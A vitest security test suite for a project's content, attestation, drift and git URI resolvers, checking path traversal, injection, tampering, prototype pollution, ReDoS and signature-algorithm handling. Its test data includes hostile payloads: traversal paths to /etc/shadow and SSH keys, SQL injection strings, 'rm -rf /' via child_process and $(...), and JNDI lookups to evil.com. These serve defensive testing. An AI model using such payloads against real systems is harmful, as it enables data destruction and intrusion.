/**
 * Security Validation Test Suite for URI Resolvers
 * 
 * Tests security scenarios including:
 * - JWT verification and cryptographic attestations
 * - Input sanitization and injection prevention
 * - Access control and permission validation
 * - Cryptographic integrity verification
 * - Secure handling of malicious inputs
 */

import { describe, test, expect, beforeEach, afterEach, vi } from 'vitest';
import crypto from 'crypto';
import fs from 'fs-extra';
import path from 'path';
import { tmpdir } from 'os';

// Import resolver classes
import { ContentUriResolver } from '../../src/kgen/cas/content-uri-resolver.js';
import { AttestResolver } from '../../src/kgen/attestation/attest-resolver.js';
import { DriftURIResolver } from '../../src/kgen/drift/drift-uri-resolver.js';
import { GitUriResolver } from '../../packages/kgen-core/src/resolvers/git-uri-resolver.js';

describe('Security Validation Tests', () => {
  let testDir;
  let resolvers;
  let testKeys;
  
  beforeEach(async () => {
    testDir = path.join(tmpdir(), 'security-test-' + this.getDeterministicTimestamp());
    await fs.ensureDir(testDir);
    
    // Generate test cryptographic keys
    testKeys = {
      privateKey: crypto.generateKeyPairSync('ed25519').privateKey,
      publicKey: crypto.generateKeyPairSync('ed25519').publicKey,
      hmacKey: crypto.randomBytes(32)
    };
    
    resolvers = {
      content: new ContentUriResolver({
        casDir: path.join(testDir, 'cas'),
        integrityChecks: true,
        enableHardlinks: false // Disable for security testing
      }),
      attest: new AttestResolver({
        storageDir: path.join(testDir, 'attest'),
        verificationEnabled: true,
        cacheSize: 50
      }),
      drift: new DriftURIResolver({
        storage: {
          patchDirectory: path.join(testDir, 'patches')
        }
      }),
      git: new GitUriResolver({
        cacheDir: path.join(testDir, 'git-cache'),
        enableAttestation: true
      })
    };
    
    // Initialize resolvers
    for (const resolver of Object.values(resolvers)) {
      try {
        await resolver.initialize();
      } catch (error) {
        console.warn('Resolver security init warning:', error.message);
      }
    }
  });
  
  afterEach(async () => {
    if (testDir && await fs.pathExists(testDir)) {
      await fs.remove(testDir);
    }
  });

  describe('Input Sanitization and Validation', () => {
    test('should reject malicious URI schemes', async () => {
      const maliciousUris = [
        'javascript://alert(1)',
        'data://text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'http://evil.com/malicious',
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\cmd.exe',
        'content://sha256/../../../etc/passwd'
      ];
      
      for (const uri of maliciousUris) {
        // Test content URI validation
        if (uri.startsWith('content://')) {
          const validation = resolvers.content.validateContentURI(uri);
          expect(validation.valid).toBe(false);
        }
        
        // Test that resolvers don't process malicious schemes
        if (uri.startsWith('git://')) {
          const validation = resolvers.git.validateGitUri(uri);
          expect(validation.valid).toBe(false);
        }
        
        // Attestation URIs should also be validated
        if (uri.startsWith('attest://')) {
          expect(() => {
            resolvers.attest.parseAttestURI(uri);
          }).toThrow();
        }
      }
    });

    test('should sanitize file paths and prevent directory traversal', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        '~/.ssh/id_rsa',
        'file:///etc/shadow',
        '\0/etc/passwd', // Null byte injection
        '../cas/../../../etc/passwd'
      ];
      
      for (const maliciousPath of maliciousPaths) {
        // Test that content storage doesn't allow path traversal
        const content = 'Test content';
        const result = await resolvers.content.store(content, {
          source: maliciousPath,
          preserveExtension: true
        });
        
        // Verify the actual path is within the CAS directory
        expect(result.path).toContain(testDir);
        expect(result.path).not.toContain('../');
        expect(result.path).not.toContain('..\\');
        expect(result.path).not.toContain('/etc/');
        expect(result.path).not.toContain('\\system32\\');
      }
    });

    test('should validate hash formats strictly', () => {
      const invalidHashes = [
        'not-a-hash',
        '123', // Too short
        'g'.repeat(64), // Invalid characters
        'a'.repeat(63), // Wrong length
        'a'.repeat(65), // Wrong length
        '<script>alert(1)</script>',
        '../../../etc/passwd',
        '\0' + 'a'.repeat(63), // Null byte injection
        'a'.repeat(32) + '\n' + 'evil-content'
      ];
      
      invalidHashes.forEach(invalidHash => {
        const uri = `content://sha256/${invalidHash}`;
        const validation = resolvers.content.validateContentURI(uri);
        expect(validation.valid).toBe(false);
        expect(validation.error).toBeDefined();
      });
    });

    test('should prevent SQL injection attempts in metadata', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE metadata; --",
        "' OR '1'='1",
        "'; UPDATE metadata SET value='hacked'; --",
        "' UNION SELECT password FROM users --",
        "'; DELETE FROM attestations; --"
      ];
      
      for (const payload of sqlInjectionPayloads) {
        const content = 'SQL injection test';
        const result = await resolvers.content.store(content, {
          metadata: {
            name: payload,
            description: payload,
            tags: [payload]
          }
        });
        
        // Should store successfully (treating as regular text)
        expect(result.stored).toBe(true);
        
        // Verify the payload is stored as literal text, not executed
        const resolved = await resolvers.content.resolve(result.uri);
        expect(resolved.metadata.name).toBe(payload);
        
        // No database should be affected (metadata stored as JSON)
        expect(() => JSON.parse(JSON.stringify(resolved.metadata))).not.toThrow();
      }
    });
  });

  describe('Cryptographic Security', () => {
    test('should verify content integrity with cryptographic hashes', async () => {
      const sensitiveContent = 'Sensitive data that must not be tampered with';
      const result = await resolvers.content.store(sensitiveContent);
      
      // Verify the hash matches expected value
      const expectedHash = crypto.createHash('sha256').update(sensitiveContent).digest('hex');
      expect(result.hash).toBe(expectedHash);
      
      // Try to tamper with stored content
      await fs.writeFile(result.path, 'Tampered content');
      
      // Resolution should detect tampering
      await expect(resolvers.content.resolve(result.uri)).rejects.toThrow(/integrity/i);
    });

    test('should create cryptographically secure attestations', async () => {
      const testData = {
        subject: 'security-critical-artifact',
        validator: 'security-suite',
        claims: ['integrity', 'authenticity', 'non-repudiation']
      };
      
      const attestation = await resolvers.attest.createAttestation(testData, {
        issuer: 'trusted-authority',
        signingKey: testKeys.hmacKey,
        includeContent: false
      });
      
      // Verify attestation structure
      expect(attestation.version).toBe('1.0');
      expect(attestation.content.hash).toMatch(/^[a-f0-9]{64}$/);
      expect(attestation.provenance.generator).toBe('kgen-attestation-resolver');
      
      // If signature is present, verify it
      if (attestation.signature) {
        expect(attestation.signature.algorithm).toBeDefined();
        expect(attestation.signature.value).toBeDefined();
        expect(attestation.signature.keyId).toBeDefined();
      }
    });

    test('should detect and reject tampered attestations', async () => {
      const originalAttestation = {
        version: '1.0',
        timestamp: this.getDeterministicDate().toISOString(),
        subject: 'tamper-detection-test',
        content: {
          type: 'application/json',
          hash: 'original-hash-value',
          data: { sensitive: 'information' }
        },
        claims: {
          'urn:security:integrity': true
        }
      };
      
      const originalHash = crypto.createHash('sha256')
        .update(JSON.stringify(originalAttestation, null, 2))
        .digest('hex');
      
      // Create tampered version
      const tamperedAttestation = {
        ...originalAttestation,
        content: {
          ...originalAttestation.content,
          data: { sensitive: 'HACKED' } // Tampered content
        }
      };
      
      // Verification should fail for tampered attestation
      const verification = await resolvers.attest.verifyAttestation(tamperedAttestation, originalHash);
      
      expect(verification.valid).toBe(false);
      expect(verification.error).toContain('hash mismatch');
    });

    test('should handle cryptographic signature verification', async () => {
      const testData = { test: 'signature verification' };
      
      // Create attestation with HMAC signature
      const attestation = await resolvers.attest.createAttestation(testData, {
        signingKey: testKeys.hmacKey.toString('hex'),
        includeContent: true
      });
      
      expect(attestation.signature).toBeDefined();
      expect(attestation.signature.algorithm).toBe('HMAC-SHA256');
      expect(attestation.signature.value).toBeDefined();
      
      // Mock signature verification to return true for valid signatures
      const originalVerify = resolvers.attest.verifySignature;
      resolvers.attest.verifySignature = vi.fn().mockResolvedValue(true);
      
      const verification = await resolvers.attest.verifyAttestation(
        attestation, 
        crypto.createHash('sha256').update(JSON.stringify(attestation)).digest('hex')
      );
      
      expect(verification.checks.signature).toBe(true);
      
      // Restore original method
      resolvers.attest.verifySignature = originalVerify;
    });

    test('should validate timestamp security', async () => {
      const now = this.getDeterministicDate();
      
      const testCases = [
        {
          name: 'future timestamp (more than 5 minutes)',
          timestamp: new Date(now.getTime() + 10 * 60 * 1000).toISOString(),
          shouldBeValid: false
        },
        {
          name: 'old timestamp (more than 1 year)',
          timestamp: new Date(now.getTime() - 2 * 365 * 24 * 60 * 60 * 1000).toISOString(),
          shouldBeValid: false
        },
        {
          name: 'valid recent timestamp',
          timestamp: new Date(now.getTime() - 1 * 60 * 1000).toISOString(),
          shouldBeValid: true
        }
      ];
      
      for (const testCase of testCases) {
        const attestation = {
          version: '1.0',
          timestamp: testCase.timestamp,
          subject: 'timestamp-security-test',
          content: { type: 'test' }
        };
        
        const hash = crypto.createHash('sha256')
          .update(JSON.stringify(attestation))
          .digest('hex');
        
        const verification = await resolvers.attest.verifyAttestation(attestation, hash);
        
        if (testCase.shouldBeValid) {
          expect(verification.checks.timestamp).toBe(true);
        } else {
          expect(verification.checks.timestamp).toBe(false);
        }
      }
    });
  });

  describe('Access Control and Permissions', () => {
    test('should respect file system permissions', async () => {
      // Create a restricted directory
      const restrictedDir = path.join(testDir, 'restricted');
      await fs.ensureDir(restrictedDir);
      await fs.chmod(restrictedDir, 0o000); // No permissions
      
      const restrictedResolver = new ContentUriResolver({
        casDir: restrictedDir
      });
      
      // Should fail to initialize due to permissions
      await expect(restrictedResolver.initialize()).rejects.toThrow();
      
      // Restore permissions for cleanup
      await fs.chmod(restrictedDir, 0o755);
    });

    test('should not expose sensitive file system information', async () => {
      const content = 'Test content for path exposure test';
      const result = await resolvers.content.store(content);
      
      // Resolved path should not contain sensitive information
      expect(result.path).not.toContain('/etc/');
      expect(result.path).not.toContain('/home/');
      expect(result.path).not.toContain('/root/');
      expect(result.path).not.toContain('C:\\Windows\\');
      expect(result.path).not.toContain('C:\\Users\\');
      
      // Should only contain the test directory path
      expect(result.path).toContain(testDir);
    });

    test('should validate provenance chain security', async () => {
      const validChain = [
        {
          source: 'template-engine',
          target: 'artifact-1',
          method: 'nunjucks-render',
          timestamp: this.getDeterministicDate().toISOString(),
          hash: crypto.randomBytes(32).toString('hex')
        },
        {
          source: 'artifact-1',
          target: 'artifact-2',
          method: 'post-process',
          timestamp: this.getDeterministicDate().toISOString(),
          previousHash: crypto.randomBytes(32).toString('hex'),
          hash: crypto.randomBytes(32).toString('hex')
        }
      ];
      
      const invalidChain = [
        {
          source: '../../../etc/passwd', // Path traversal attempt
          target: 'artifact-1',
          method: 'nunjucks-render'
          // Missing required fields
        },
        {
          // Missing source
          target: 'artifact-2',
          method: 'malicious-script'
        }
      ];
      
      // Valid chain should pass
      const validResult = await resolvers.attest.verifyProvenanceChain(validChain);
      expect(validResult).toBe(true);
      
      // Invalid chain should fail
      const invalidResult = await resolvers.attest.verifyProvenanceChain(invalidChain);
      expect(invalidResult).toBe(false);
    });
  });

  describe('Malicious Input Handling', () => {
    test('should handle extremely large inputs safely', async () => {
      // Test with large content (but within reasonable limits)
      const largeContent = 'x'.repeat(10 * 1024 * 1024); // 10MB
      
      const result = await resolvers.content.store(largeContent);
      
      expect(result.stored).toBe(true);
      expect(result.size).toBe(largeContent.length);
      
      // Should be able to resolve without memory issues
      const resolved = await resolvers.content.resolve(result.uri);
      expect(resolved.size).toBe(largeContent.length);
    });

    test('should reject malformed JSON in patches', async () => {
      const malformedJsonPatches = [
        '{"malformed": json}', // Invalid JSON
        '{"valid": "json", "but": {"nested": {"evil": "\\u0000null-byte"}}}',
        '{"__proto__": {"evil": "prototype-pollution"}}',
        '{"constructor": {"prototype": {"evil": "pollution"}}}',
        '{"extremely": {"deeply": {"nested": {"object": {"that": {"could": {"cause": {"stack": {"overflow": {"issues": "value"}}}}}}}}}}',
      ];
      
      // Most malformed patches should be handled gracefully
      for (const malformedPatch of malformedJsonPatches) {
        try {
          const parsed = JSON.parse(malformedPatch);
          
          // If it parses as valid JSON, test applying it
          const baseline = { test: 'data' };
          const applyResult = await resolvers.drift.applyPatch(baseline, parsed);
          
          // Should either succeed or fail gracefully
          if (applyResult.result) {
            expect(applyResult.result).toBeDefined();
          }
        } catch (error) {
          // Invalid JSON should be rejected cleanly
          expect(error).toBeInstanceOf(SyntaxError);
        }
      }
    });

    test('should handle malicious metadata injection', async () => {
      const maliciousMetadata = {
        '__proto__': { evil: true },
        'constructor': { prototype: { evil: true } },
        'eval': 'alert("hacked")',
        'function': 'new Function("return process")()',
        'require': 'require("child_process").exec("rm -rf /")',
        '\0': 'null-byte-injection',
        '../../../': 'path-traversal',
        '${jndi:ldap://evil.com/}': 'log4j-style-injection'
      };
      
      const content = 'Content with malicious metadata';
      const result = await resolvers.content.store(content, {
        metadata: maliciousMetadata
      });
      
      expect(result.stored).toBe(true);
      
      const resolved = await resolvers.content.resolve(result.uri);
      
      // Metadata should be stored as-is but not executed
      expect(resolved.metadata.__proto__).toEqual({ evil: true });
      expect(resolved.metadata.eval).toBe('alert("hacked")');
      
      // Verify no code execution occurred
      expect(global.evil).toBeUndefined();
    });

    test('should prevent ReDoS attacks in URI validation', () => {
      // Regular expressions that could cause ReDoS (Regular Expression Denial of Service)
      const redosPayloads = [
        'content://sha256/' + 'a'.repeat(1000000) + 'invalid', // Very long string
        'git://' + 'a'.repeat(100000) + '@' + 'b'.repeat(40),
        'drift://' + 'semantic/'.repeat(10000) + 'type/id',
        'attest://sha256/' + ('a' + 'b'.repeat(100)).repeat(1000)
      ];
      
      redosPayloads.forEach(payload => {
        const startTime = this.getDeterministicTimestamp();
        
        try {
          if (payload.startsWith('content://')) {
            resolvers.content.validateContentURI(payload);
          } else if (payload.startsWith('git://')) {
            resolvers.git.validateGitUri(payload);
          } else if (payload.startsWith('drift://')) {
            resolvers.drift.parseDriftURI(payload);
          } else if (payload.startsWith('attest://')) {
            resolvers.attest.parseAttestURI(payload);
          }
        } catch (error) {
          // Expected to fail, but should fail quickly
        }
        
        const endTime = this.getDeterministicTimestamp();
        const duration = endTime - startTime;
        
        // Should not take more than 100ms (ReDoS would take much longer)
        expect(duration).toBeLessThan(100);
      });
    });
  });

  describe('Secure Configuration', () => {
    test('should use secure defaults', () => {
      const defaultContentResolver = new ContentUriResolver();
      const defaultAttestResolver = new AttestResolver();
      
      // Content resolver should have integrity checks enabled by default
      expect(defaultContentResolver.options.integrityChecks).toBe(true);
      
      // Attestation resolver should have verification enabled by default
      expect(defaultAttestResolver.options.verificationEnabled).toBe(true);
      
      // Should use appropriate cache sizes (not too large to avoid DoS)
      expect(defaultContentResolver.options.cacheSize).toBeGreaterThan(0);
      expect(defaultContentResolver.options.cacheSize).toBeLessThan(10000);
    });

    test('should validate configuration parameters', () => {
      // Test invalid cache sizes
      expect(() => {
        new ContentUriResolver({ cacheSize: -1 });
      }).not.toThrow(); // Should handle gracefully
      
      expect(() => {
        new ContentUriResolver({ cacheSize: 'invalid' });
      }).not.toThrow(); // Should use default
      
      // Test invalid directory paths
      const resolver = new ContentUriResolver({
        casDir: '\0/invalid/path'
      });
      
      // Should not crash, but may fail during initialization
      expect(resolver).toBeDefined();
    });

    test('should handle concurrent security operations safely', async () => {
      const content = 'Concurrent security test';
      const promises = [];
      
      // Start multiple security-sensitive operations concurrently
      for (let i = 0; i < 10; i++) {
        promises.push(async () => {
          const result = await resolvers.content.store(content + i);
          const resolved = await resolvers.content.resolve(result.uri);
          return resolved.hash === result.hash;
        });
      }
      
      const results = await Promise.all(promises.map(fn => fn()));
      
      // All operations should succeed and maintain integrity
      results.forEach(result => {
        expect(result).toBe(true);
      });
    });
  });

  describe('Error Security', () => {
    test('should not expose sensitive information in error messages', async () => {
      const sensitiveContent = 'SECRET_API_KEY=very-secret-key';
      const result = await resolvers.content.store(sensitiveContent);
      
      // Corrupt the file to trigger an error
      await fs.writeFile(result.path, 'corrupted');
      
      try {
        await resolvers.content.resolve(result.uri);
        expect(false).toBe(true); // Should have thrown
      } catch (error) {
        // Error message should not contain the sensitive content
        expect(error.message).not.toContain('SECRET_API_KEY');
        expect(error.message).not.toContain('very-secret-key');
        expect(error.message).not.toContain(result.path); // No file paths
      }
    });

    test('should handle invalid attestation verification securely', async () => {
      const maliciousAttestation = {
        version: '1.0',
        subject: '../../../etc/passwd',
        content: {
          type: 'application/json',
          hash: 'malicious-hash'
        },
        signature: {
          algorithm: 'eval("malicious-code")',
          value: '../../../../../../etc/shadow',
          keyId: 'rm -rf /'
        }
      };
      
      // Should handle malicious attestation without executing anything
      const verification = await resolvers.attest.verifyAttestation(
        maliciousAttestation, 
        'test-hash'
      );
      
      expect(verification.valid).toBe(false);
      expect(verification.error).toBeDefined();
      
      // No malicious code should have been executed
      expect(global.malicious).toBeUndefined();
    });
  });

  describe('JWT Security Validation', () => {
    test('should handle JWT-like structures in attestations securely', async () => {
      // Create an attestation that looks like a JWT but should be treated as data
      const jwtLikeData = {
        header: { alg: 'HS256', typ: 'JWT' },
        payload: { 
          iss: 'test-issuer',
          sub: 'test-subject',
          exp: Math.floor(this.getDeterministicTimestamp() / 1000) + 3600,
          iat: Math.floor(this.getDeterministicTimestamp() / 1000)
        },
        signature: 'fake-signature-value'
      };
      
      const attestation = await resolvers.attest.createAttestation(jwtLikeData, {
        issuer: 'test-authority'
      });
      
      expect(attestation.content.hash).toBeDefined();
      expect(attestation.version).toBe('1.0');
      
      // Should not be treated as executable JWT
      const uri = await resolvers.attest.store(attestation);
      const resolved = await resolvers.attest.resolve(uri);
      
      expect(resolved.attestation).toBeDefined();
      expect(resolved.verified).toBeDefined();
    });

    test('should validate signature algorithms securely', () => {
      const dangerousAlgorithms = [
        'none',
        'None',
        'NONE',
        'eval',
        'function',
        '../algorithm',
        '$(rm -rf /)',
        '${jndi:ldap://evil.com/}'
      ];
      
      dangerousAlgorithms.forEach(algorithm => {
        const testData = 'Test signature data';
        const testKey = 'test-key';
        
        try {
          const signature = resolvers.attest.generateSignature(testData, testKey, algorithm);
          
          // If it doesn't throw, it should return a valid signature format
          if (signature) {
            expect(typeof signature).toBe('string');
            expect(signature.length).toBeGreaterThan(0);
          }
        } catch (error) {
          // Should throw for unsupported/dangerous algorithms
          expect(error.message).toContain('Unsupported signature algorithm');
        }
      });
    });
  });
});